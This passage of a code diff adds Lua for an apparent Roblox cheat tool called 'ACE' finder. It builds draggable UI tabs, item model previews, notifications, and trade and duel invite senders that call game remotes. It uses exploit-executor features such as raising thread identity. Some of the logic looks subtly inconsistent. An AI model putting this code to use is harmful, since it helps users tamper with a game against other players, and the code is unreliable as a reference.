+              v87.TextYAlignment = Enum.TextYAlignment.Center
+              return viewportFrame
+            end
+
+            local clone = v86:Clone()
+            clone.Parent = instance2
+            viewportFrame:SetAttribute("ACEModelReady", true)
+
+            for _, descendant in ipairs(clone:GetDescendants()) do
+              if descendant:IsA("BasePart") then
+                descendant.Anchored = true
+                descendant.CanCollide = false
+                descendant.CastShadow = false
+              elseif descendant:IsA("Script") or descendant:IsA("LocalScript") then
+                descendant:Destroy()
+              elseif not flag18 and (descendant:IsA("ParticleEmitter") or descendant:IsA("Trail")) then
+                descendant.Enabled = false
+              end
+            end
+
+            local v87 = nil
+            local v88 = fn50(arg3)
+
+            if flag18 or v88 == "Default" then
+              viewportFrame:SetAttribute("MutationReady", true)
+            else
+              local ok, result2 = pcall(function()
+                return Animals:ApplyMutation(clone, arg, v88)
+              end)
+
+              if ok then
+                v87 = result2
+                viewportFrame:SetAttribute("MutationReady", true)
+              else
+                aceFinderRuntime.LastMutationError = tostring(result2)
+              end
+            end
+
+            viewportFrame.Destroying:Connect(function()
+              if typeof(v87) == "RBXScriptConnection" then
+                v87:Disconnect()
+              elseif typeof(v87) == "Instance" then
+                v87:Destroy()
+              elseif type(v87) == "function" then
+                pcall(v87)
+              elseif type(v87) == "table" then
+                for _, v89 in ipairs({ "Normal", "Clean", "None" }) do
+                  local v90 = v87[v89]
+                  local v91 = "function"
+                  if type(v90) == v91 then
+                    pcall(v90, v87)
+                    break
+                  end
+                end
+              end
+            end)
+
+            pcall(function()
+              if clone:IsA("Model") then
+                clone:PivotTo(CFrame.new(0, 0, 0))
+              end
+            end)
+
+            local flag19 = arg4 == "baseidle" and tbl25[arg] or nil
+
+            if flag19 and flag19.Yaw then
+              pcall(function()
+                clone:PivotTo(clone:GetPivot() * CFrame.Angles(0, flag19.Yaw, 0))
+              end)
+            end
+
+            local boundingBox, v89 = clone:GetBoundingBox()
+            local n36 = math.max(v89.X, v89.Y, v89.Z)
+            local n37 = boundingBox.Position + Vector3.new(0, v89.Y * 0.04, 0)
+
+            if arg4 == "baseidle" then
+              local tbl26 = flag19 or {}
+              local n38 = n37 - Vector3.new(0, v89.Y * (tbl26.YShift or 0), 0)
+              fn54(clone, arg)
+
+              table.insert(tbl23, {
+                Mode = "baseidle",
+                Viewport = viewportFrame,
+                Camera = camera,
+                Center = n38,
+                CameraOrigin = Vector3.new(n38.X, n38.Y + v89.Y * 0.3, n38.Z - n36 * 1.6 * (tbl26.DistanceScale or 1) + 0.02),
+                LookHeight = v89.Y * 0.45,
+              })
+            else
+              local v90 = 0.2
+
+              table.insert(tbl23, {
+                Viewport = viewportFrame,
+                Camera = camera,
+                Center = n37,
+                Radius = n36 * 0.85 + 0.08,
+                Angle = 0.6108652381980153 + math.random() * v90,
+                Speed = 0.62,
+                Float = math.max(v89.Y * 0.03, 0.02),
+              })
+            end
+
+            return viewportFrame
+          end
+
+          fn39 = function(arg, arg2, arg3)
+            local brainrotName = type(arg2) == "table" and arg2.BrainrotName or nil
+            local mutation = type(arg2) == "table" and arg2.Mutation or nil
+            fn50(mutation)
+            local v86 = createViewportFrame
+            local str8
+
+            if arg3 then
+              str8 = arg3
+            else
+              str8 = string.sub(tostring(brainrotName or "?"), 1, 1)
+            end
+
+            local v87 = v86(arg, brainrotName, str8, mutation, nil)
+            if v87:GetAttribute("ACEModelReady") then
+              return v87
+            end
+
+            task.spawn(function()
+              for i = 1, 250 do
+                if not aceFinderRuntime.Running or not arg.Parent then
+                  return
+                end
+                local flag18 = arg2.UID ~= nil and fn49(arg2.UID) or nil
+
+                if not flag18 and (i == 1 or i == 40 or i % 8 == 0) then
+                  flag18 = fn51(brainrotName, mutation)
+                end
+
+                if flag18 then
+                  local ok, result2 = pcall(createViewportFrame, arg, brainrotName, arg3, mutation, nil, flag18)
+
+                  if ok and result2 then
+                    if v87 and v87.Parent then
+                      v87:Destroy()
+                    end
+
+                    v87 = result2
+                    return
+                  end
+                end
+
+                task.wait(0.1)
+              end
+            end)
+
+            return v87
+          end
+
+          flag15 = service.TouchEnabled and not service.KeyboardEnabled
+          local viewportSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080)
+          local flag18 = flag15 and math.min(viewportSize.X, viewportSize.Y) < 600
+          n32 = flag18 and 0.7 or 1
+          local v86 = flag18 and 250
+
+          if v86 then
+            n33 = v86
+          else
+            n33 = flag15 and 290 or 370
+          end
+
+          local v87 = flag18 and 300
+
+          if v87 then
+            n34 = v87
+          else
+            n34 = flag15 and 350 or 430
+          end
+
+          v78 = flag15 and 44 or 50
+          n35 = flag15 and 30 or 34
+          screenGui2 = Instance.new("ScreenGui")
+          screenGui2.Name = "FinderUI"
+          screenGui2.ResetOnSpawn = false
+          screenGui2.IgnoreGuiInset = true
+          screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+          screenGui2.DisplayOrder = 9999
+
+          pcall(function()
+            screenGui2.OnTopOfCoreBlur = true
+          end)
+
+          fn29(screenGui2, playerGui)
+          instance = Instance.new("Frame")
+          instance.Name = "Win"
+          instance.Size = UDim2.fromOffset(n33, n34)
+          instance.Position = flag15 and UDim2.new(0.5, -n33 / 2, 0.1, 4) or UDim2.new(0.5, -n33 / 2, 0.5, -n34 / 2)
+          instance.BackgroundColor3 = tbl21.BG
+          instance.BackgroundTransparency = 0
+          instance.BorderSizePixel = 0
+          instance.ClipsDescendants = true
+          instance.Parent = screenGui2
+          fn35(instance, 17)
+          uiScale = Instance.new("UIScale")
+          uiScale.Name = "FinderMainScale"
+          uiScale.Scale = finderUISettingsState.GuiScale * n32
+          uiScale.Parent = instance
+
+          playOpenAnimation = function()
+            local n36 = finderUISettingsState.GuiScale * n32
+            uiScale.Scale = math.max(0.05, n36 * 0.6)
+            TweenService2:Create(uiScale, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = n36 }):Play()
+          end
+
+          playOpenAnimation()
+          imageLabel = Instance.new("ImageLabel")
+          imageLabel.Name = "Background"
+          imageLabel.Size = UDim2.fromScale(1, 1)
+          imageLabel.BackgroundTransparency = 1
+          local v88 = tbl19[finderUISettingsState.BackgroundIndex] or tbl19[1]
+          imageLabel.Image = v88.Image
+          imageLabel.ImageTransparency = 0
+          imageLabel.ScaleType = v88.ScaleType
+          imageLabel.Visible = not v88.IsNone
+          imageLabel.ZIndex = 0
+          imageLabel.ImageTransparency = 0
+          imageLabel.Parent = instance
+          fn35(imageLabel, 17)
+          local frame2 = Instance.new("Frame")
+          frame2.Name = "BackgroundShade"
+          frame2.Size = UDim2.fromScale(1, 1)
+          frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+          frame2.BackgroundTransparency = 0.45
+          frame2.BorderSizePixel = 0
+          frame2.ZIndex = 1
+          frame2.Parent = instance
+          fn35(frame2, 16)
+          local v89 = createFrame
+
+          local tbl26 = {
+            Count = flag18 and 6 or flag15 and 10 or 14,
+            ZIndex = 90,
+            MinDuration = 5.8,
+            MaxDuration = 9.2,
+          }
+
+          local fallingParticlesEnabled = finderUISettingsState.FallingParticlesEnabled
+          v89(instance, tbl26).Visible = fallingParticlesEnabled
+          v79 = nil
+
+          fn40 = function(arg)
+            if not finderUISettingsState.NotificationsEnabled or type(arg) ~= "table" or type(arg.BrainrotName) ~= "string" then
+              return
+            end
+
+            if v79 then
+              v79:Destroy()
+              v79 = nil
+            end
+
+            local frame3 = Instance.new("Frame")
+            frame3.Name = "FinderNotification"
+            frame3.Size = UDim2.fromOffset(flag15 and 278 or 360, flag15 and 58 or 64)
+            frame3.AnchorPoint = Vector2.new(0.5, 0)
+            frame3.Position = UDim2.new(0.5, 0, 0, -(flag15 and 72 or 80))
+            frame3.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+            frame3.BackgroundTransparency = 0.02
+            frame3.BorderSizePixel = 0
+            frame3.ClipsDescendants = true
+            frame3.ZIndex = 100
+            local aceSniperTopBarGui = genv3.ACESniperTopBarGui
+            frame3.Parent = aceSniperTopBarGui and aceSniperTopBarGui.Parent and aceSniperTopBarGui or screenGui2
+            fn35(frame3, 12)
+            local instance2 = Instance.new("Frame")
+            instance2.Name = "BrainrotPhoto"
+            instance2.Size = UDim2.fromOffset(flag15 and 48 or 54, flag15 and 48 or 54)
+            instance2.Position = UDim2.fromOffset(6, flag15 and 5 or 5)
+            instance2.BackgroundColor3 = tbl21.PhotoBG
+            instance2.BorderSizePixel = 0
+            instance2.ZIndex = 102
+            instance2.Parent = frame3
+            fn35(instance2, 12)
+            local frame4 = Instance.new("Frame")
+            frame4.Size = UDim2.new(1, -4, 1, -6)
+            frame4.Position = UDim2.fromOffset(2, 2)
+            frame4.BackgroundTransparency = 1
+            frame4.ZIndex = 103
+            frame4.Parent = instance2
+            fn39(frame4, arg, string.sub(arg.BrainrotName, 1, 1))
+            local n36 = flag15 and 64 or 72
+            local v90 = ""
+            local v91 =
+              createTextLabel(frame3, tostring(fn52(arg.BrainrotName)) .. v90, flag15 and 11 or 13, tbl21.White, Enum.Font.GothamBlack)
+            v91.Size = UDim2.new(1, -(n36 + 12), 1, 0)
+            v91.Position = UDim2.fromOffset(n36, 0)
+            v91.TextXAlignment = Enum.TextXAlignment.Left
+            v91.TextYAlignment = Enum.TextYAlignment.Center
+            v91.TextTruncate = Enum.TextTruncate.AtEnd
+            v91.ZIndex = 103
+            v79 = frame3
+            fn34(
+              frame3,
+              TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+              { Position = UDim2.new(0.5, 0, 0, flag15 and 8 or 14) }
+            )
+
+            fn33(function(arg2, arg3)
+              if not arg2 and arg3 then
+                aceFinderRuntime.LastSoundError = tostring(arg3)
+              end
+            end)
+
+            task.delay(8, function()
+              if v79 ~= frame3 or not frame3.Parent then
+                return
+              end
+              local tween = TweenService2:Create(
+                frame3,
+                TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+                { Position = UDim2.new(0.5, 0, 0, -(flag15 and 72 or 26)) }
+              )
+              tween:Play()
+
+              tween.Completed:Connect(function()
+                if v79 == frame3 then
+                  v79 = nil
+                end
+
+                frame3:Destroy()
+              end)
+            end)
+          end
+        end
+
+        local frame2, live, online, v80
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Size = UDim2.new(1, 0, 0, v78)
+          frame3.BackgroundColor3 = tbl21.Header
+          frame3.BackgroundTransparency = 1
+          frame3.BorderSizePixel = 0
+          frame3.Active = true
+          frame3.ZIndex = 5
+          frame3.Parent = instance
+          fn35(frame3, 16)
+          frame2 = Instance.new("Frame")
+          frame2.Size = UDim2.new(1, 0, 0, 8)
+          frame2.Position = UDim2.new(0, 0, 1, -8)
+          frame2.BackgroundColor3 = tbl21.Header
+          frame2.BackgroundTransparency = 1
+          frame2.BorderSizePixel = 0
+          frame2.ZIndex = 5
+          frame2.Parent = frame3
+          local instance2 = Instance.new("Frame")
+          instance2.Name = "BrandMark"
+          instance2.Size = UDim2.fromOffset(flag15 and 27 or 34, flag15 and 24 or 30)
+          instance2.Position = UDim2.fromOffset(flag15 and 13 or 17, flag15 and 11 or 13)
+          instance2.BackgroundTransparency = 1
+          instance2.BorderSizePixel = 0
+          instance2.ClipsDescendants = true
+          instance2.ZIndex = 6
+          instance2.Parent = frame3
+          fn35(instance2, 15)
+          local instance3 = Instance.new("Frame")
+          instance3.Name = "Content"
+          instance3.Size = UDim2.fromScale(1, 1)
+          instance3.BackgroundTransparency = 1
+          instance3.Image = "rbxassetid://71891923282375"
+          instance3.ScaleType = Enum.ScaleType.Fit
+          instance3.ZIndex = 7
+          instance3.Parent = instance2
+          fn35(instance3, 15)
+          local v81 = createTextLabel(frame3, "ACE", flag15 and 14 or 18, tbl21.White, Enum.Font.GothamBlack)
+          v81.Size = UDim2.new(1, -130, 0, 28)
+          v81.Position = UDim2.fromOffset(flag15 and 48 or 56, flag15 and 12 or 14)
+          v81.TextYAlignment = Enum.TextYAlignment.Center
+          v81.ZIndex = 6
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "TitleDivider"
+          frame4.Size = UDim2.new(1, -28, 0, 1)
+          frame4.Position = UDim2.new(0, 17, 1, -2)
+          frame4.BackgroundColor3 = tbl21.White
+          frame4.BackgroundTransparency = 0.55
+          frame4.BorderSizePixel = 0
+          frame4.ZIndex = 6
+          frame4.Parent = frame3
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "Close"
+          textButton.Size = UDim2.fromOffset(32, 32)
+          textButton.Position = UDim2.new(1, -40, 0.5, -16)
+          textButton.BackgroundColor3 = tbl21.Card
+          textButton.BorderSizePixel = 0
+          textButton.Text = ""
+          textButton.AutoButtonColor = false
+          textButton.ZIndex = 7
+          textButton.Parent = frame3
+          fn35(textButton, 7)
+          createUIStroke2(textButton, tbl21.Border, 1)
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Horizontal"
+          frame5.AnchorPoint = Vector2.new(0.5, 0.5)
+          frame5.Size = UDim2.fromOffset(10, 2)
+          frame5.Position = UDim2.fromScale(0.5, 0.5)
+          frame5.BackgroundColor3 = tbl21.White
+          frame5.BorderSizePixel = 0
+          frame5.ZIndex = 8
+          frame5.Parent = textButton
+          fn35(frame5, 1)
+          local frame6 = Instance.new("Frame")
+          frame6.Name = "Vertical"
+          frame6.AnchorPoint = Vector2.new(0.5, 0.5)
+          frame6.Size = UDim2.fromOffset(2, 0)
+          frame6.Position = UDim2.fromScale(0.5, 0.5)
+          frame6.BackgroundColor3 = tbl21.White
+          frame6.BorderSizePixel = 0
+          frame6.ZIndex = 8
+          frame6.Parent = textButton
+          fn35(frame6, 1)
+          local v82 = createTextLabel(instance, "discord.gg/aceduels", 8, tbl21.White, Enum.Font.GothamBold)
+          v82.Name = "DiscordFooter"
+          v82.Size = UDim2.new(1, 0, 0, 14)
+          v82.Position = UDim2.new(0, 0, 1, -12)
+          v82.TextXAlignment = Enum.TextXAlignment.Center
+          v82.TextStrokeColor3 = tbl21.BG
+          v82.TextStrokeTransparency = 0.45
+          v82.ZIndex = 4
+          local flag16 = false
+          local position = nil
+          local position2 = nil
+
+          frame3.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+              flag16 = true
+              position = input.Position
+              position2 = instance.Position
+            end
+          end)
+
+          frame3.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+              flag16 = false
+            end
+          end)
+
+          service.InputChanged:Connect(function(input)
+            if flag16 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+              local n36 = input.Position - position
+              instance.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n36.X, position2.Y.Scale, position2.Y.Offset + n36.Y)
+            end
+          end)
+
+          local n36 = flag15 and 28 or 40
+          local instance4 = Instance.new("Frame")
+          instance4.Name = "TabsBackdrop"
+          instance4.Size = UDim2.new(1, 0, 0, n36)
+          instance4.Position = UDim2.new(0, 0, 0, v78 + 4)
+          instance4.BackgroundColor3 = Color3.fromRGB(6, 6, 12)
+          instance4.BackgroundTransparency = 0
+          instance4.BorderSizePixel = 0
+          instance4.ClipsDescendants = true
+          instance4.ZIndex = 4
+          instance4.Parent = instance
+          local instance5 = Instance.new("UIListLayout")
+          instance5.FillDirection = Enum.FillDirection.Horizontal
+          instance5.HorizontalAlignment = Enum.HorizontalAlignment.Left
+          instance5.VerticalAlignment = Enum.VerticalAlignment.Center
+          instance5.Padding = UDim.new(0, 0)
+          instance5.SortOrder = Enum.SortOrder.LayoutOrder
+          instance5.Parent = instance4
+          local frame7 = Instance.new("Frame")
+          frame7.Size = UDim2.new(1, 0, 1, -(v78 + n35 + 6))
+          frame7.Position = UDim2.new(0, 0, 0, v78 + n35 + 4)
+          frame7.BackgroundTransparency = 1
+          frame7.ClipsDescendants = true
+          frame7.Parent = instance
+
+          local function fn41(parent)
+            local instance6 = Instance.new("ScrollingFrame")
+            instance6.Size = UDim2.fromScale(1, 1)
+            instance6.BackgroundTransparency = 1
+            instance6.BorderSizePixel = 0
+            instance6.ScrollBarThickness = 3
+            instance6.ScrollBarImageColor3 = Color3.fromRGB(150, 75, 150)
+            instance6.AutomaticCanvasSize = Enum.AutomaticSize.Y
+            instance6.CanvasSize = UDim2.new()
+            instance6.ScrollingDirection = Enum.ScrollingDirection.Y
+            instance6.Parent = parent
+            local instance7 = Instance.new("UIListLayout")
+            instance7.FillDirection = Enum.FillDirection.Vertical
+            instance7.HorizontalAlignment = Enum.HorizontalAlignment.Center
+            instance7.Padding = UDim.new(0, 6)
+            instance7.SortOrder = Enum.SortOrder.LayoutOrder
+            instance7.Parent = instance6
+            createUIPadding(instance6, 8, 10, 8, 8)
+            return instance6
+          end
+
+          local tbl23 = {}
+          local v83 = nil
+          local flag17 = false
+
+          local function fn42(arg)
+            for i, v84 in ipairs(tbl23) do
+              if v84 == arg then
+                return i
+              end
+            end
+
+            return 1
+          end
+
+          local function fn43(arg, arg2)
+            fn34(arg.Button, tweenInfo, { BackgroundColor3 = arg2 and Color3.fromRGB(18, 18, 24) or Color3.fromRGB(12, 8, 11) })
+            fn34(arg.Label, tweenInfo, { TextColor3 = arg2 and tbl21.White or tbl21.TabInact })
+          end
+
+          local function fn44(arg)
+            if v83 == arg or flag17 then
+              return
+            end
+            local v84 = v83
+            v83 = arg
+
+            if v84 then
+              fn43(v84, false)
+            end
+
+            fn43(arg, true)
+            if not v84 then
+              arg.Page.Visible = true
+              return
+            end
+            flag17 = true
+            local n37 = fn42(arg) > fn42(v84) and 1 or -1
+            local n38 = math.max(frame7.AbsoluteSize.X, n33)
+            arg.Page.Position = UDim2.fromOffset(n37 * n38, 0)
+            arg.Page.Visible = true
+            fn34(v84.Page, tweenInfo3, { Position = UDim2.fromOffset(-n37 * n38, 0) })
+            local tween = TweenService2:Create(arg.Page, tweenInfo3, { Position = UDim2.new() })
+            tween:Play()
+
+            tween.Completed:Connect(function()
+              v84.Page.Visible = false
+              v84.Page.Position = UDim2.new()
+              flag17 = false
+              return
+            end)
+          end
+
+          local function fn45(name, layoutOrder)
+            local textButton2 = Instance.new("TextButton")
+            textButton2.Name = name
+            textButton2.LayoutOrder = layoutOrder
+            textButton2.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
+            textButton2.BackgroundColor3 = Color3.fromRGB(8, 8, 11)
+            textButton2.BackgroundTransparency = 0
+            textButton2.BorderSizePixel = 0
+            textButton2.Text = ""
+            textButton2.AutoButtonColor = false
+            textButton2.ZIndex = 5
+            textButton2.Parent = instance4
+
+            if layoutOrder > 1 then
+              local frame8 = Instance.new("Frame")
+              frame8.Size = UDim2.new(0, 1, 1, -10)
+              frame8.Position = UDim2.new(0, 0, 0, 5)
+              frame8.BackgroundColor3 = Color3.fromRGB(88, 90, 98)
+              frame8.BackgroundTransparency = 0.55
+              frame8.BorderSizePixel = 0
+              frame8.ZIndex = 6
+              frame8.Parent = textButton2
+            end
+
+            local v84 = createTextLabel(textButton2, name, flag15 and 9 or 10, tbl21.TabInact, Enum.Font.GothamBold)
+            v84.Size = UDim2.fromScale(1, 1)
+            v84.TextXAlignment = Enum.TextXAlignment.Center
+            v84.TextYAlignment = Enum.TextYAlignment.Center
+            v84.ZIndex = 6
+            local instance6 = Instance.new("Frame")
+            instance6.Size = UDim2.fromScale(1, 1)
+            instance6.BackgroundTransparency = 1
+            instance6.Visible = false
+            instance6.ClipsDescendants = true
+            instance6.Parent = frame7
+            local tbl24 = { Button = textButton2, Label = v84, Page = instance6, Scroll = fn41(instance6) }
+            table.insert(tbl23, tbl24)
+
+            textButton2.MouseEnter:Connect(function()
+              if v83 ~= tbl24 then
+                fn34(textButton2, tweenInfo, { BackgroundColor3 = Color3.fromRGB(13, 13, 17) })
+                fn34(v84, tweenInfo, { TextColor3 = Color3.fromRGB(196, 190, 200) })
+              end
+            end)
+
+            textButton2.MouseLeave:Connect(function()
+              if v83 ~= tbl24 then
+                fn43(tbl24, false)
+              end
+            end)
+
+            textButton2.MouseButton1Click:Connect(function()
+              fn44(tbl24)
+            end)
+
+            return tbl24
+          end
+
+          live = fn45("LIVE", 1)
+          online = fn45("ONLINE", 2)
+          v80 = fn45("SETTINGS", 3)
+          fn44(live)
+          local flag18 = false
+          local flag19 = false
+          local tweenInfo4 = TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+          textButton.MouseButton1Click:Connect(function()
+            local aceSniperBarDock = genv3.ACESniperBarDock
+
+            if type(aceSniperBarDock) == "function" then
+              task.spawn(function()
+                local v84 = setthreadidentity or setidentity
+
+                if v84 then
+                  pcall(v84, 8)
+                end
+
+                pcall(aceSniperBarDock, "show")
+              end)
+
+              return
+            end
+
+            if flag19 then
+              return
+            end
+            flag19 = true
+            flag18 = not flag18
+
+            if flag18 then
+              frame7.Visible = false
+              instance4.Visible = false
+              frame2.Visible = false
+              v82.Visible = false
+              fn34(frame6, tweenInfo4, { Size = UDim2.fromOffset(2, 10) })
+              local tween = TweenService2:Create(instance, tweenInfo4, { Size = UDim2.fromOffset(n33, v78) })
+              tween:Play()
+
+              tween.Completed:Connect(function()
+                flag19 = false
+              end)
+            else
+              fn34(frame6, tweenInfo4, { Size = UDim2.fromOffset(2, 0) })
+              local tween = TweenService2:Create(instance, tweenInfo4, { Size = UDim2.fromOffset(n33, n34) })
+              tween:Play()
+
+              tween.Completed:Connect(function()
+                frame2.Visible = true
+                instance4.Visible = true
+                frame7.Visible = true
+                v82.Visible = true
+                flag19 = false
+              end)
+            end
+          end)
+        end
+
+        local fn41
+
+        fn41 = function(parent, arg, layoutOrder)
+          local instance2 = Instance.new("Frame")
+          instance2.Size = UDim2.new(1, -12, 0, 26)
+          instance2.BackgroundTransparency = 1
+          instance2.LayoutOrder = layoutOrder or 0
+          instance2.Parent = parent
+          local frame3 = Instance.new("Frame")
+          frame3.Size = UDim2.new(1, 0, 0, 1)
+          frame3.Position = UDim2.new(0, 0, 0.5, 0)
+          frame3.BackgroundColor3 = tbl21.Border
+          frame3.BorderSizePixel = 0
+          frame3.Parent = instance2
+          local frame4 = Instance.new("Frame")
+          frame4.Size = UDim2.fromOffset(#arg * 7 + 18, 18)
+          frame4.Position = UDim2.new(0, 10, 0.5, -9)
+          frame4.BackgroundColor3 = tbl21.BG
+          frame4.BackgroundTransparency = 0
+          frame4.BorderSizePixel = 0
+          frame4.ZIndex = 2
+          frame4.Parent = instance2
+          fn35(frame4, 6)
+          local v81 = createTextLabel(frame4, arg, 10, tbl21.Dim, Enum.Font.GothamBold)
+          v81.Size = UDim2.fromScale(1, 1)
+          v81.TextXAlignment = Enum.TextXAlignment.Center
+          v81.ZIndex = 3
+          return instance2
+        end
+
+        local sendTrade, sendDuel, tbl23, fn42, tbl24, tbl25, v81, v82
+
+        do
+          local function fn43(arg, arg2)
+            arg.MouseEnter:Connect(function()
+              fn34(arg, tweenInfo, { BackgroundColor3 = Color3.fromRGB(14, 14, 18) })
+              fn34(arg2, tweenInfo, { Color = Color3.fromRGB(150, 96, 164) })
+            end)
+
+            arg.MouseLeave:Connect(function()
+              fn34(arg, tweenInfo, { BackgroundColor3 = tbl21.Card })
+              fn34(arg2, tweenInfo, { Color = tbl21.Border })
+            end)
+          end
+
+          local tbl26 = nil
+          aceFinderRuntime.TradeCooldownSeconds = 26
+          aceFinderRuntime.DuelCooldownSeconds = 20
+          finderUISettingsState.LastTradeInviteAt = tonumber(finderUISettingsState.LastTradeInviteAt) or -math.huge
+          finderUISettingsState.LastDuelInviteAt = tonumber(finderUISettingsState.LastDuelInviteAt) or -math.huge
+
+          local function fn44(arg)
+            if type(arg) ~= "string" or not arg:lower():find("cooldown", 1, true) then
+              return nil
+            end
+            return tonumber(arg:match("[%d%.]+"))
+          end
+
+          local function fn45(arg, arg2)
+            local v83 = "function"
+            arg = type(arg) == v83 and arg or "REJECTED"
+            local num = fn44(arg)
+            local str8 = arg:lower()
+
+            if str8:find("pending trade", 1, true) or str8:find("pending duel", 1, true) or str8:find("pending request", 1, true) then
+              num = tonumber(arg2)
+            end
+
+            if num then
+              local v84 = "s"
+              return "COOLDOWN " .. tostring(math.ceil(num)) .. v84, num
+            end
+            return arg, nil
+          end
+
+          local function fn46(arg)
+            aceFinderRuntime.LastActionMessage = tostring(arg or "ACTION")
+          end
+
+          sendTrade = function(arg, arg2)
+            local fn47 = arg2 or function() end
+
+            if type(arg) ~= "number" or arg == localPlayer2.UserId then
+              fn47(false, "ERROR")
+              return
+            end
+            local lastTradeInviteAt = finderUISettingsState.LastTradeInviteAt
+            local n36 = 26 - os.clock() - lastTradeInviteAt
+            if 0 < n36 then
+              fn47(false, "COOLDOWN " .. tostring(math.ceil(n36)) .. "s", n36)
+              return
+            end
+            finderUISettingsState.LastTradeInviteAt = os.clock()
+
+            task.spawn(function()
+              if v76 and type(v76.SendInvite) == "function" then
+                local flag16 = false
+
+                local ok, result, result2 = pcall(function()
+                  return v76:SendInvite(arg, function(arg3, arg4)
+                    if flag16 then
+                      return
+                    end
+                    flag16 = true
+
+                    if arg3 == true then
+                      fn47(true, arg4)
+                      fn46("TRADE INVITE SENT")
+                    else
+                      local v83, v84 = fn45(arg4, 26)
+                      fn47(false, v83, v84)
+                      fn46(v83)
+                    end
+                  end)
+                end)
+
+                if not ok then
+                  fn47(false, "ERROR")
+                  fn46("TRADE INVITE ERROR")
+                  return
+                end
+
+                if result == false then
+                  flag16 = true
+                  local v83, v84 = fn45(result2, 26)
+                  fn47(false, v83, v84)
+                  fn46(v83)
+                  return
+                end
+
+                task.delay(15, function()
+                  if flag16 or not aceFinderRuntime.Running then
+                    return
+                  end
+                  flag16 = true
+                  fn47(false, "TIMED OUT")
+                  fn46("TRADE INVITE TIMED OUT")
+                end)
+
+                return
+              end
+
+              if not remotes.Invite then
+                fn47(false, "NO REMOTE")
+                return
+              end
+
+              local ok, result, result2 = pcall(function()
+                return remotes.Invite:InvokeServer(str7, arg)
+              end)
+
+              if not ok then
+                fn47(false, "ERROR")
+                fn46("TRADE INVITE ERROR")
+              elseif result == false then
+                local v83, v84 = fn45(result2, 26)
+                fn47(false, v83, v84)
+                fn46(v83)
+              else
+                fn47(true)
+                fn46("TRADE INVITE SENT")
+              end
+            end)
+          end
+
+          sendDuel = function(arg, arg2)
+            local fn47 = arg2 or function() end
+
+            local v83 = "number"
+            if type(arg) ~= v83 or arg == localPlayer2.UserId then
+              fn47(false, "ERROR")
+              return
+            end
+            local lastDuelInviteAt = finderUISettingsState.LastDuelInviteAt
+            local n36 = aceFinderRuntime.DuelCooldownSeconds - os.clock() - lastDuelInviteAt
+
+            if 0 < n36 then
+              local v84 = "s"
+              fn47(false, "COOLDOWN " .. tostring(math.ceil(n36)) .. v84, n36)
+              return
+            end
+
+            if not v77 or type(v77.SendInvite) ~= "function" then
+              fn47(false, "TRADE UNAVAILABLE")
+              return
+            end
+
+            if type(v77.IsEnabled) == "function" then
+              local ok, result = pcall(function()
+                return v77:IsEnabled()
+              end)
+
+              if ok and not result then
+                fn47(false, "INVITES DISABLED")
+                return
+              end
+            end
+
+            finderUISettingsState.LastDuelInviteAt = os.clock()
+
+            task.spawn(function()
+              local ok, result, result2 = pcall(function()
+                return v77:SendInvite(arg)
+              end)
+
+              if not ok then
+                fn47(false, "ERROR")
+                fn46("DUEL INVITE ERROR")
+              elseif result == false then
+                local v84, v85 = fn45(result2, aceFinderRuntime.DuelCooldownSeconds)
+                fn47(false, v84, v85)
+                fn46(v84)
+              else
+                fn47(true)
+                fn46("DUEL INVITE SENT")
+              end
+            end)
+          end
+
+          local tbl27 = {
+            { Label = "S.ELEPH", Model = "Strawberry Elephant", Match = { "strawberryelephant" } },
+            { Label = "MEOWL", Model = "Meowl", Match = { "meowl" } },
+            { Label = "SKIBIDI", Model = "Skibidi Toilet", Match = { "skibiditoilet", "skibidi" } },
+            { Label = "J.PORK", Model = "John Pork", Match = { "johnpork" } },
+          }
+
+          tbl23 = {}
+
+          if type(v75) == "table" then
+            for k, v83 in pairs(v75) do
+              local flag16 = type(k) == "string" and type(v83) == "table"
+
+              if flag16 then
+                flag16 = string.upper(tostring(v83.Rarity or v83.rarity or "")) == "OG"
+              end
+
+              if flag16 then
+                tbl23[fn37(k)] = true
+
+                if type(v83.DisplayName) == "string" then
+                  local v84 = true
+                  tbl23[fn37(v83.DisplayName)] = v84
+                end
+              end
+            end
+          end
+
+          for _, v83 in ipairs(tbl27) do
+            local v84 = ipairs
+            local match = v83.Match or {}
+
+            for _, v85 in v84(match) do
+              local v86 = true
+              tbl23[fn37(v85)] = v86
+            end
+
+            if v83.Model then
+              tbl23[fn37(v83.Model)] = true
+            end
+          end
+
+          local color = Color3.fromRGB(244, 242, 246)
+          local photoBG = tbl21.PhotoBG
+          local color2 = Color3.fromRGB(8, 8, 10)
+          local photoBG2 = tbl21.PhotoBG
+          local photoBG3 = tbl21.PhotoBG
+          local color3 = Color3.fromRGB(70, 54, 62)
+          aceFinderRuntime.FilterRefreshers = {}
+          aceFinderRuntime.OGModeVisualRefreshers = {}
+
+          aceFinderRuntime.RefreshFilters = function()
+            for _, filterRefresher in ipairs(aceFinderRuntime.FilterRefreshers) do
+              pcall(filterRefresher)
+            end
+          end
+
+          aceFinderRuntime.RefreshOGModeVisuals = function(arg)
+            for _, ogModeVisualRefresher in ipairs(aceFinderRuntime.OGModeVisualRefreshers) do
+              pcall(ogModeVisualRefresher, arg == true)
+            end
+          end
+
+          aceFinderRuntime.SetOGOnlyEnabled = function(arg, arg2)
+            finderUISettingsState.OGOnlyEnabled = arg == true
